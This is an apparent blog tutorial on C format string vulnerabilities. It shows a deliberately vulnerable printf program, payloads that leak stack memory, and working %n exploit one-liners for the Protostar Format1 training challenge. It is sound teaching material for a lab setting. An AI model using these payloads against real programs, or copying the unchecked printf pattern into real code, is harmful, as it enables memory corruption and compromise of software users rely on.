---
title: Introduction to Format Strings
excerpt: This post aims to serve as a visual and simple introduction to format string vulnerabilities.
categories:
  - Application Security
tags:
  - format strings
  - exploit
---

This post will be a simple introduction to the classic format string
vulnerability. I will guide you through the basics of how format string
vulnerabilities are exploited with practical examples.

*Disclaimer*: This post assumes very basic knowledge of assembly (how the ESP and
EBP are used for managing stack frames, as well as calling conventions), some
prior knowledge of the C programming language, and basic shell scripting.


```printf()``` and it's family of functions are amongst the most used in the C
language. They make outputting data, either to a buffer, file, or stream
trivial. The printf definition is as follows:

```c
int printf(const char *format, ...);
```

```printf()``` leverages *varargs* allowing for a variable number of arguments
to be passed. It knows how much data and how to format it through a specially
crafted string known as a format string (```const char *format``` above). A
major vulnerability arises if the user can control this format string.

This post will first briefly go over a few key ```printf()``` format string
options, although it does assume the reader has used the C library
```printf()``` before. We will then examine how memory can be read from the
stack by exploiting such a vulnerability. Finally, we'll demonstrate how format
strings can be leveraged for arbitrary writes to memory.

## Important Format String Options

The key format string conversion specifiers are the following:

| Parameter | Input | Output |
|:----------|:------|:-------|
| %x        | unsigned integer | Hexadecimal value |
| %s        | pointer to an array of char | String |
| %n        | pointer to integer | Number of bytes written so far |
| %p        | pointer (void *) | The value of the pointer (Not de-referenced) |

The key modifiers are the following:

| Modifier | Description | Example |
|:---------|:------------|:--------|
| i$       | Direct parameter access; Specifies the parameter to use for input | ```%2$x``` : hex value of second parameter |
| %ix      | Length specifier. Specifies the length of the output. | ```%8x```: Hex value taking up 8 columns |
| %hh      | Length modifier. Specifies that length is sizeof(char) | ```%hhn```: Writes 1 byte to target pointer |
| %h       | Length modifier. Specifies that length is sizeof(short) | ```%hn```: Writes 2 bytes (in 32 bit System) to target pointer |

If you do not fully understand all of the above parameters and modifiers, I
highly suggest playing around with them using a simple C program. I personally
found they were easier to grasp through practice.

## Reading Memory

Alright, with the above options listed as a reference, let's now look at an
example of a format string vulnerability:

```c
#include <stdlib.h>
#include <stdio.h>

void		  vulnerable(const char *input)
{
  volatile int	  value = 0x45454545;
  printf(input);
}

int		  main(int ac, char **av)
{
    volatile int  value = 42;
    char	  buffer[64];

    fgets(buffer, sizeof(buffer), stdin);
    vulnerable(buffer);
    return 0;
}
```

In the above example, we can see the program asks the user for input, and then
displays the input:

```sh
user@vulnerable:/tmp$ ./fmt-b
test
test
```

The issue is, the input is passed directly to the format string. This is a text
book example of a format string vulnerability. Let's see what happens if we
enter the string ```%x.%x.%x.%x```.

```sh
user@protostar:/tmp$ ./fmt-b
%x.%x.%x.%x         
bffff7ac.3f.a.1
```

So what's going on here? Why did it output data if no data was passed via
varargs?

Well, in the format string we told it to expect 4 integers, and that we would
like them to be output in hexadecimal. Thus, it took the 4 integers from the
location in which they should be located: the stack.

Here we examined 16 bytes of the stack. Specifically, values located at ESP,
ESP+4, ESP+8, ESP+12 at that given time.

Let's write a small script to further visualise this. We'll make use of direct
parameter access to display each byte one at a time (ESP, ESP+4, ESP+8, ...).
We'll begin our input with four A's (hex value 0x41) so we can easily identify
our format buffer on the stack.

```sh
user@vulnerable:/tmp$ for i in {1..35}; do echo "AAAA." "%$i\$x" | ./fmt-b; done
AAAA.bffff7ac
AAAA.3f
AAAA.a
AAAA.1
AAAA.0
AAAA.bffff7ac
AAAA.45454545
AAAA.0
AAAA.0
AAAA.bffff7f8
AAAA.8048478
AAAA.bffff7ac
AAAA.40
AAAA.b7fd8420
AAAA.b7f0186e
AAAA.b7fd7ff4
AAAA.b7ec6165
AAAA.bffff7b8
AAAA.41414141
AAAA.3032252e
AAAA.a7824
AAAA.bffff7c8
AAAA.8048314
AAAA.b7ff1040
AAAA.804962c
AAAA.bffff7f8
AAAA.80484a9
AAAA.b7fd8304
AAAA.b7fd7ff4
AAAA.8048490
AAAA.bffff7f8
AAAA.b7ec6365
AAAA.b7ff1040
AAAA.804849bprotostar
AAAA.2a
```

As we can see, we're moving up the stack (from lower memory to higher memory),
and we eventually hit the parameter we passed to printf (the 19th line:
AAAA.41414141). This means it takes 76 bytes to reach our actual format string
from where printf is processing it.

Let's reorient this from higher memory to lower memory, and examine what is going
on exactly:

![Format-Stack](/assets/images/format-strings/read-stack.png)

As we can see, the first line of our output is **0x2a**. This is equal to 42.
It's the variable ```value``` in ```main```.

We can see in green the start of our user input; the actual format string.
Because we started it with with four 'A's it is easy to spot; ASCII 'A' is equal
to 0x41, thus the byte is equal to **0x41414141**.

In red we can see the value **0x8048478**. Upon examination using GDB we can find
that this is the return address for ```vulnerable```.

Finally, in blue at the bottom, we see the value of vulnerable's local variable
```value``` which I placed to help identify what values in the stack correspond
to what.

So as we can see, by controlling the format string of printf, we are able to
analyse the stack, leaking all of it's contents including pointers to code.
With a leaked pointer, we defeat ASLR, but information on that will be for
another time :) .

## Arbitrary Writes

For this section, I'll simply explain the theory behind how an arbitrary write
can be achieved by exploiting a format string vulnerability. I'll demonstrate
with a basic example; the Format1 challenge from Protostar. My next post will
be a full write-up of the Protostar format challenges, which will show more
advanced usages of the techniques shown here.

If we look back to the format conversion specifiers I listed above, we'll notice
one that allows for writing to a pointer: ```%n```. Now the question is, how
do we control the pointer it uses for writing a value?

By using direct parameter access.

Just before we saw how we can read the stack's memory by exploiting a format
string vulnerability. We also noticed that our use input (the format string) is
accessible.

Well, what if we started this format string with an address rather than four
'A's? We should then be able to use the direct parameter access modifier to
specify that this address we entered is the pointer we want to use!

Let's take the example *Format1* from Protostar which can be found here:
[Format1](https://exploit-exercises.com/protostar/format1/)

The program simply checks if a global variable has been modified. All we have to
do is find the address of that variable, find the parameter offset of our format
string in memory (as we've done before), and us ```%n``` to modify it's value.

To obtain the address of the global:

```sh
user@protostar:/opt/protostar/bin$ objdump -t format1 | grep "target"
08049638 g     O .bss	00000004              target
```

The address is **0x08049638**.

We'll calculate the offset the same way we've done before; using a small bash
script:

```sh
user@protostar:/opt/protostar/bin$ for i in {1..200}; do ./format1 "AAAAAAAA.%$i\$x" | grep "41414141"; if (( $? == 0 )); then echo "Offset: $i"; fi done
AAAAAAAA.41414141
Offset: 130
```

> Note: we used eight 'A's due to potential padding issues. We may have to account
> for padding in the exploit too.

And now our exploit:

```sh
user@protostar:/opt/protostar/bin$ ./format1 $(python -c 'print "\x38\x96\x04\x08" + "PPPP" + "%130$n"')
8�PPPPyou have modified the target :)
```

> Note: the 'P's are for padding.

As we can see, we have successfully modified the global variables address
proving successful arbitrary writes.

Now, ```%n``` writes the total number of characters written so far to the
pointer. We can increase the number written by using length specifiers. For
example, if we wanted to write the value 32 to ```target``` in format1:

```sh
user@protostar:/opt/protostar/bin$ ./format1 $(python -c 'print "\x38\x96\x04\x08" + "" + "%28x" + "%130$n"')
8�                     804960cyou have modified the target :)
```

Now let's break down what's happening here by listing what's written:
  - address: 4 bytes
  - padding: 0 bytes. No longer used due to the length specifier bellow.
  - length specifier: 28 bytes. We don't really care about it's value, just that
  it takes up 28 bytes.
  - the conversion specifier telling us to write at the 130th parameter.

If we add everything up, we'll notice it adds up to 32! The value the conversion
specifier will then write to our address.

Now, why is the padding no longer needed? Well simply, this moved the stack in
such a way that we no longer needed it. Padding can be a pain when exploiting
format strings.

## Conclusion

Format Strings are used by the printf family of functions to indicate what data
the function should expect, and how to format it. It is considered a major
vulnerability if the user can control this string.

In this post we presented basic examples of how format string vulnerabilities
can be leveraged to achieve arbitrary reads and writes to memory. For more
examples, my next post will be a write-up of the Protostar format string
challenges.
